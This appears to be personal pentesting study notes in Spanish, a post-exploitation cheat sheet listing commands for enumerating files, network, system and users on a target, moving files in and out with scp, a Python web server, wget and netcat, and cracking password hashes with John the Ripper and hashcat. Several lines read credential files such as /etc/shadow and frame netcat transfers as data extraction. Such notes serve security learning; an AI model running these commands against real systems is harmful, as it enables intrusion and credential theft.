# Compilar información de archivos en el destino

## Descripción
Recopilamos información sobre los archivos del sistema objetivo, como nombres, tamaños, permisos y fechas de modificación.

## Herramientas
Para recopilar información sobre un directorio, podemos hacerlo gracias a los comandos que tenemos en el sistema.

Linux:
`find /directorio/a/enumerar -type f -exec ls -l {} \;`

Windows:
`dir /s /p /q`
`tree /f`

# Enumerar información de red de archivos en el destino

## Descripción 
Recopilar detalles sobre la configuración de red del objetivo, como las interfaces, ip, rutas y firewall.

## Herramientas

Linux:
Para reconocer la red en linux, tenemos los distintos comandos.
`ip a`
`ip route`
`route -n`
`iptables -L`

Windows:
`ipconfig /all`
`route print`
`netstat -r`
`netstat -nabo`
`netsh firewall show state`

# Enumerar la información del sistema en el objetivo

## Descripción
Para enumerar la información del sistema, necesitaremos sacar la versión del sistema operativo, parches instalados, servicios en ejecución y hardware


## Herramientas

Linux:
`uname -a`
`lsb_release -a`
`ps aux`
`df -h`

Windows:
`systeminfo`
`tasklist`
`wmic qfe get Caption,Description,HotFixID,InstalledOn`

Info discos:
``wmic diskdrive get Caption, DeviceID, Size, MediaType
wmic logicaldisk get Name, Size, FreeSpace``


# Recopilar información de la cuenta de usuario en el objetivo

## Descripción
Obtener información sobre las cuentas de usuario en el sistema, incluyendo nombres de usuario, grupos y permisos

## Herramientas

Linux:
`cat /etc/passwd`
`cat /etc/group`
`id usuario`

Windows:
`net user`
`net group`


# Transferir archivos hacia y desde el destino
## Descripción
Transferir archivos hacia y desde el objetivo, puede ser útil para obtener herramientas en el objetivo y también para extraer datos.

## Herramientas
SSH:
`scp archivoPasar usuario@remoteip:/ruta/de/destino`
`scp usuario@remoteip:/ruta/del/archivo archivoCoger`

Python:
Con python podemos hacer un servidor web muy facilmente.
`python3 -m http.server 80`

Esto empezará un servidor web en el puerto 80, en el directorio que hayamos ejecutado el comando. Lo que nos permitirá coger cosas del servidor con un wget.
`wget ipPythonServer/archivo`

Netcat:

Emisor:
`nc remoteIP PORT < archivo`

Receptor:
`nc -nvlp PORT > archivo`

Esto transferirá el archivo. 

# Recopilar información de hash/contraseña del objetivo

## Descripción

Extraer hashes de contraseñas , tanto de base de datos como en scripts... E intentar crackearlas. También puede ser que encontremos alguna contraseña en texto plano.

## Herramientas
John the ripper:
Con esta herramienta podemos hacer ataques de fuerza bruta a hashes de contraseña.

Practica de ejemplo:
`unshadow /etc/passwd /etc/shadow > password.txt`
`john --wordlist=/path/to/dictionary password.txt`
`john --wordlist=/home/kali/contraas.txt  hash.txt --format=crypt ` "--format=crypt(sirve para yescrypt que es el hash de la pass de linux)"
`john --show password.txt`


Con john podemos adaptarnos a diferentes formatos de hash y tipos de archivos protegidos por contraseña. Existen unas herramientas que convierten estos archivos o hashes a un formato legible para john the ripper. Estas herramientas son programas conocidos como 2john. Ej:
zip2john -- rar2john -- pdf2john -- keepass2john...

Hashcat

Con esta herramienta también podemos hacer ataques de fuerza bruta a contraseñas.

Ejemplos de uso:

`hashcat -m 0 -a 0 hash.txt rockyou.txt`

Con -m especificamos el tipo de hash (MD5 en este caso)
-a especifica el modo de ataque (ataque de diccionario)
Primero se pone el archivo donde tenemos el hash a crackear y luego ponemos el diccionario 

![[Pasted image 20240726123331.png]]
Para saber el tipo de hash que es, podemos utilizar la herramienta de hash-identifier
